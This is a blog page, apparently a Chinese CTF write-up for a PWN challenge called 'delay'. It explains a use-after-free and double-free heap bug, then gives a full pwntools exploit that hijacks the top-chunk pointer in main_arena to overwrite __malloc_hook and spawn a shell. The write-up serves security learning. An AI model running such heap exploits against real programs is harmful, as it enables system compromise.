@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="学习给自己的">
+    <meta name="description" content="一天一步，总会到的">
+    <meta name="author" content="LOLOLO">
+    
+    <title>
+        
+            top chunk的一种利用 |
+        
+        桥下少年
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"lololo-pwn.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/1.jpg","favicon":"/images/1.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"不要留恋过去,空想未来,专注当下。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                桥下少年
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">top chunk的一种利用</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">LOLOLO</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2021-11-17 16:56:43</span>
+        <span class="mobile">2021-11-17 16:56</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Competition/">Competition</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>622 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>3 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="delay"><a href="#delay" class="headerlink" title="delay"></a>delay</h2><blockquote>
+<p>四川省省赛的一道PWN题，学到了关于top_chunk利用的新手法</p>
+</blockquote>
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="/2021/11/17/top-chunk%E7%9A%84%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8/1.png"></p>
+<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><img src="/2021/11/17/top-chunk%E7%9A%84%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8/2.png"></p>
+<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><img src="/2021/11/17/top-chunk%E7%9A%84%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8/3.png"></p>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><ol>
+<li>UAF</li>
+<li>double free</li>
+</ol>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先说开始我的错误，我一开始闷头写，用double free和UAF构造了free_hook写入了fd；后面突然发现，它限制了size大小为0x58，而申请到free_hook需要0x7f；当场自闭！</p>
+<p>后面看了别的师傅的wp，发现可以改top_chunk在main_arena中的地址为free_hook-0x28的位置，这样在下次申请堆块的时候，就会从free_hook-0x28的位置开始分配，这样我们就可以往free_hook和realloc_hook里面写入。最后free拿shell；exp来源于这位<a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxMjg0OTIyNg==&mid=2650676294&idx=1&sn=be2d7e32f038a9175f94b6385aa1cd1f&chksm=83a12563b4d6ac753689e783d3561e609e248ce8b85c1447c2439768f5a5d27719ce1560a0fa&mpshare=1&scene=23&srcid=0906p5Mojuv14ngJ4fPC0UA4&sharer_sharetime=1630857840593&sharer_shareid=c439ba78140b3ae9082ec923df2e12b3#rd">师傅<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n, l=<span class="number">8</span></span>):</span></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cmd</span>(<span class="params">n, wait=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>(wait):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27; :&#x27;</span>)</span><br><span class="line">    Num(n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">size, cont=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(cont)==<span class="number">0</span>):</span><br><span class="line">        cont = <span class="string">&#x27;A&#x27;</span>*(size-<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    Cmd(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(size)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    sh.send(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    Cmd(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    Cmd(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    Num(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GDB</span>():</span></span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    telescope (0x202040+0x0000555555554000) 16</span></span><br><span class="line"><span class="string">    break *malloc</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk arrange</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#A</span></span><br><span class="line">Add(<span class="number">0x48</span>)   <span class="comment">#B</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span>+flat(<span class="number">0</span>, <span class="number">0x51</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#C</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#E</span></span><br><span class="line"><span class="comment">#fastbin cyclic</span></span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)   <span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line"><span class="comment">#get heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x170</span></span><br><span class="line"><span class="comment"># Log(&#x27;heap_addr&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#forge big chunk</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(heap_addr+<span class="number">0x210</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;C</span></span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>)</span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0</span>, <span class="number">0xA1</span>)+<span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#D&#x27;s size=0xA1</span></span><br><span class="line"><span class="comment">#get UB chunk</span></span><br><span class="line">Delete(<span class="number">3</span>)   <span class="comment">#UB&lt;=&gt;(DE, 0xa0)</span></span><br><span class="line"><span class="comment">#get libc addr</span></span><br><span class="line">Show(<span class="number">3</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3c4b78</span></span><br><span class="line">sys = libc.address + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># Log(&#x27;libc.address&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Fastbin-&gt;A&lt;-&gt;B</span></span><br><span class="line">Delete(<span class="number">0</span>)   </span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 1</span></span><br><span class="line">Add(<span class="number">0x48</span>, flat(<span class="number">0x61</span>)+<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#Fastbin-&gt;B-&gt;A-&gt;0x61</span></span><br><span class="line"><span class="comment">#clean PtrArr, because it&#x27;s Full</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;clear done!\n&#x27;</span>)</span><br><span class="line">Num(<span class="number">666</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#forge size in main_arena 2</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;A-&gt;0x61</span></span><br><span class="line">Add(<span class="number">0x48</span>)               <span class="comment">#Fastbin-&gt;0x61</span></span><br><span class="line"><span class="comment">#Fastbin Attack</span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#C </span></span><br><span class="line">Add(<span class="number">0x58</span>)   <span class="comment">#D</span></span><br><span class="line"><span class="comment">#Fastbin[0x60]-&gt;C&lt;-&gt;D</span></span><br><span class="line">Delete(<span class="number">2</span>)   </span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin alloc to main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>, flat(libc.address+<span class="number">0x3c4b38</span>)+<span class="string">&#x27;\n&#x27;</span>)    <span class="comment">#Fastbin-&gt;D-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;C-&gt;main_arena</span></span><br><span class="line">Add(<span class="number">0x58</span>)       <span class="comment">#Fastbin-&gt;main_arena</span></span><br><span class="line"><span class="comment">#forege main_arena-&gt;top = __malloc_hook</span></span><br><span class="line">Add(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x28</span>)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#alloc to hook</span></span><br><span class="line">OGG = libc.address+<span class="number">0x4527a</span></span><br><span class="line">exp = flat(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">exp+= flat(OGG)     <span class="comment">#let __malloc_hook = realloc+6 to adjust stack</span></span><br><span class="line">exp+= flat(libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">8</span>)   <span class="comment">#let __realloc_hook = OGG</span></span><br><span class="line"><span class="comment"># exp +=flat(sys)</span></span><br><span class="line">Add(<span class="number">0x58</span>, exp+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#GDB()</span></span><br><span class="line">Cmd(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">Num(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：top chunk的一种利用</li>
+        <li>本文作者：LOLOLO</li>
+        <li>创建时间：2021-11-17 16:56:43</li>
+        <li>
+            本文链接：https://lololo-pwn.github.io/2021/11/17/top-chunk的一种利用/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/PWN/">#PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/11/23/IO-FILE/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">IO_FILE</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/11/14/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">近期比赛记录</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">LOLOLO</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#delay"><span class="nav-number">1.</span> <span class="nav-text">delay</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#add"><span class="nav-number">1.1.</span> <span class="nav-text">add</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#show"><span class="nav-number">1.2.</span> <span class="nav-text">show</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free"><span class="nav-number">1.3.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">1.5.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.6.</span> <span class="nav-text">exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
